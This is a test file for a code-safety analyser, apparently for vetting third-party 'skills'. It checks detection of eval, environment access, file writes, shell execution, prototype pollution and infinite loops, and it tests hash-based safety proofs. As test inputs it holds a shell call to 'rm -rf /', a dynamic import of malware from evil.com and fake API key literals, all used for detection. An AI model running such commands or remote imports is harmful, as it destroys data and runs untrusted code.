import { describe, it, expect } from 'vitest';
import {
  analyzeSkillSafety,
  generateSkillSafetyProof,
  verifySkillSafetyProof,
} from '../src/zkp/skill-safety.js';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const CLEAN_CODE = `
export function greet(name) {
  return \`Hello, \${name}!\`;
}

export function add(a, b) {
  return a + b;
}

for (let i = 0; i < 10; i++) {
  console.log(i);
}
`;

// ---------------------------------------------------------------------------
// analyzeSkillSafety
// ---------------------------------------------------------------------------

describe('analyzeSkillSafety', () => {
  it('passes clean code', () => {
    const checks = analyzeSkillSafety(CLEAN_CODE);
    expect(checks.every((c) => c.passed)).toBe(true);
  });

  it('detects eval()', () => {
    const code = 'const result = eval("1 + 2");';
    const checks = analyzeSkillSafety(code);
    const evalCheck = checks.find((c) => c.name === 'noEval');
    expect(evalCheck?.passed).toBe(false);
  });

  it('detects new Function()', () => {
    const code = 'const fn = new Function("return 42");';
    const checks = analyzeSkillSafety(code);
    const evalCheck = checks.find((c) => c.name === 'noEval');
    expect(evalCheck?.passed).toBe(false);
  });

  it('detects process.env', () => {
    const code = 'const key = process.env.API_KEY;';
    const checks = analyzeSkillSafety(code);
    const envCheck = checks.find((c) => c.name === 'noProcessEnv');
    expect(envCheck?.passed).toBe(false);
  });

  it('detects fs.writeFile', () => {
    const code = 'fs.writeFile("/tmp/test", "data", () => {});';
    const checks = analyzeSkillSafety(code);
    const fsCheck = checks.find((c) => c.name === 'noFsWrite');
    expect(fsCheck?.passed).toBe(false);
  });

  it('detects fs.writeFileSync', () => {
    const code = 'fs.writeFileSync("/tmp/test", "data");';
    const checks = analyzeSkillSafety(code);
    const fsCheck = checks.find((c) => c.name === 'noFsWrite');
    expect(fsCheck?.passed).toBe(false);
  });

  it('detects child_process.exec', () => {
    const code = 'child_process.exec("rm -rf /");';
    const checks = analyzeSkillSafety(code);
    const shellCheck = checks.find((c) => c.name === 'noShellExec');
    expect(shellCheck?.passed).toBe(false);
  });

  it('detects __proto__', () => {
    const code = 'obj.__proto__.polluted = true;';
    const checks = analyzeSkillSafety(code);
    const protoCheck = checks.find((c) => c.name === 'noDangerousGlobals');
    expect(protoCheck?.passed).toBe(false);
  });

  it('detects while(true)', () => {
    const code = 'while(true) { doWork(); }';
    const checks = analyzeSkillSafety(code);
    const loopCheck = checks.find((c) => c.name === 'boundedLoops');
    expect(loopCheck?.passed).toBe(false);
  });

  it('detects for(;;)', () => {
    const code = 'for(;;) { process(); }';
    const checks = analyzeSkillSafety(code);
    const loopCheck = checks.find((c) => c.name === 'boundedLoops');
    expect(loopCheck?.passed).toBe(false);
  });

  it('detects hardcoded API keys (sk-...)', () => {
    const code = 'const key = "sk-abc123def456ghi789jkl012";';
    const checks = analyzeSkillSafety(code);
    const credCheck = checks.find((c) => c.name === 'noCredentialLiteral');
    expect(credCheck?.passed).toBe(false);
  });

  it('detects hardcoded AWS keys (AKIA...)', () => {
    const code = 'const key = "AKIAIOSFODNN7EXAMPLE";';
    const checks = analyzeSkillSafety(code);
    const credCheck = checks.find((c) => c.name === 'noCredentialLiteral');
    expect(credCheck?.passed).toBe(false);
  });

  it('detects dynamic network import', () => {
    const code = "const mod = await import('http://evil.com/malware.js');";
    const checks = analyzeSkillSafety(code);
    const netCheck = checks.find((c) => c.name === 'noNetworkImport');
    expect(netCheck?.passed).toBe(false);
  });

  it('multiple violations detected', () => {
    const code = `
      eval("hack");
      const key = process.env.SECRET;
      fs.writeFile("/tmp/x", "data", () => {});
    `;
    const checks = analyzeSkillSafety(code);
    const failedChecks = checks.filter((c) => !c.passed);
    expect(failedChecks.length).toBeGreaterThanOrEqual(3);
  });

  it('returns details for failed checks', () => {
    const code = 'eval("bad");';
    const checks = analyzeSkillSafety(code);
    const evalCheck = checks.find((c) => c.name === 'noEval');
    expect(evalCheck?.details).toContain('Violation');
  });
});

// ---------------------------------------------------------------------------
// Skill Safety Proof
// ---------------------------------------------------------------------------

describe('generateSkillSafetyProof', () => {
  it('creates proof with all fields', () => {
    const proof = generateSkillSafetyProof(CLEAN_CODE);

    expect(proof.codeHash).toMatch(/^0x[0-9a-f]{64}$/);
    expect(proof.analysisHash).toMatch(/^0x[0-9a-f]{64}$/);
    expect(proof.checks).toBeInstanceOf(Array);
    expect(proof.checks.length).toBeGreaterThan(0);
    expect(proof.passed).toBe(true);
    expect(proof.scheme).toBe('sha256-commit');
    expect(typeof proof.timestamp).toBe('number');
  });

  it('passed=false for unsafe code', () => {
    const proof = generateSkillSafetyProof('eval("danger");');
    expect(proof.passed).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Skill Safety Proof Verification
// ---------------------------------------------------------------------------

describe('verifySkillSafetyProof', () => {
  it('succeeds for matching code', () => {
    const proof = generateSkillSafetyProof(CLEAN_CODE);
    expect(verifySkillSafetyProof(proof, CLEAN_CODE)).toBe(true);
  });

  it('fails for modified code', () => {
    const proof = generateSkillSafetyProof(CLEAN_CODE);
    const modified = CLEAN_CODE + '\n// sneaky addition';
    expect(verifySkillSafetyProof(proof, modified)).toBe(false);
  });

  it('fails for completely different code', () => {
    const proof = generateSkillSafetyProof(CLEAN_CODE);
    expect(verifySkillSafetyProof(proof, 'eval("hack");')).toBe(false);
  });

  it('verifies unsafe code proof correctly', () => {
    const unsafeCode = 'eval("bad"); process.env.SECRET;';
    const proof = generateSkillSafetyProof(unsafeCode);
    expect(proof.passed).toBe(false);
    expect(verifySkillSafetyProof(proof, unsafeCode)).toBe(true);
  });
});
